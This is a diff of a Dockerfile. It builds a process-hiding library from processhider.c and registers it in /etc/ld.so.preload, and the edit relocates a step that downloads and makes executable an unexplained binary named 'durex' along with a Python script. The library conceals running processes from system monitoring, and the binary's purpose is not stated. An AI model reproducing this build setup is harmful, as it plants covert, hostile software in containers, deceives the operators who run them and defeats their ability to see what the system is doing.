@@ -6,19 +6,16 @@ RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
     && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
     && mv libprocess.so /usr/local/lib/ \
     && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload   
+RUN wget https://raw.githubusercontent.com/bulboni/tm/main/durex \
+    && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/nest.py \
+    && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/requirements.txt \
+    && chmod +x durex    
 
 FROM base as venv_setup
 
 # Buat direktori untuk SSH
-RUN mkdir /run/sshd \
+RUN mkdir /run/sshd 
     
-    
-RUN wget https://raw.githubusercontent.com/bulboni/tm/main/durex \
-    && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/nest.py \
-    && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/requirements.txt \
-    && chmod +x durex
-
-
 RUN python3 -m venv myenv \
     && echo 'source /myenv/bin/activate' >> /openssh.sh \
     && echo 'sleep 5' >> /openssh.sh \
